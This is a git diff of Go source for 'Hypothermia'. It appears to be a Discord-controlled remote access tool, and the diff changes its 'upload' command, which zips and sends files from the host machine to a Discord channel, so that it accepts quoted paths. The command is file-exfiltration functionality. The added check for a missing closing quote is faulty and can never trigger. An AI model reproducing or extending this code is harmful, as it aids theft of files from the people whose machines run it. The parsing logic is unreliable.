@@ -3,15 +3,16 @@ package commands
 import (
 	"fmt"
 	"os"
+	"strings"
 
 	"Hypothermia/src/utils"
-
 	"github.com/bwmarrin/discordgo"
 )
 
 const (
 	uploadUsage string = "[path]"
 
+	uploadFormatError   string = "🟥 Expected a ending quote."
 	uploadArgsError     string = "🟥 Expected 1 argument."
 	uploadFileInfoError string = "🟥 Failed to get info about the path."
 	uploadZipError      string = "🟥 Failed to zip folder."
@@ -26,7 +27,22 @@ func (*UploadCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args
 		return
 	}
 
-	path := args[0]
+	var path string
+	if strings.HasPrefix(args[0], "\"") {
+		joined := strings.Join(args, " ")
+		start := strings.Index(joined, "\"") + 1
+		end := strings.Index(joined[start:], "\"") + start
+
+		if start == 0 || end == -1 {
+			s.ChannelMessageSendReply(m.ChannelID, uploadFormatError, m.Reference())
+			return
+		}
+
+		path = joined[start:end]
+	} else {
+		path = args[0]
+	}
+
 	info, err := os.Stat(path)
 	if err != nil {
 		s.ChannelMessageSendReply(m.ChannelID, uploadFileInfoError, m.Reference())
